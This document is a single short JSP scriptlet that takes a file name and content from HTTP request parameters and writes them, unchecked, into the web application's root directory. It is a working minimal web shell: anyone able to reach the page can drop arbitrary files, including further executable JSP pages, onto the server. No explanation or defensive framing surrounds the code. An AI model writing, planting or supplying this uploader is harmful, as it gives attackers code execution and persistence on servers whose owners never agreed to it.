<%  
if(request.getParameter("filename")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("filename"))).write(request.getParameter("content").getBytes());  
%> 
